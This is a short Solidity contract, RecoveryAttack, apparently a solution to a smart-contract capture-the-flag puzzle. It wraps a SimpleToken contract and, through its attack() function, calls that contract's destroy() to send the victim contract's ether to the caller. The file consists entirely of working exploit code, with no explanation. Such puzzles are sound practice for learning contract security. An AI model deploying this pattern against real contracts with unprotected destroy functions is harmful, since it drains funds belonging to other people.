//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Recovery.sol';
contract RecoveryAttack {
    SimpleToken public victim;

    constructor ( address payable _lostContract){
        victim = SimpleToken(_lostContract);
    }

    function attack()public payable {
        victim.destroy(payable(msg.sender));
    }

}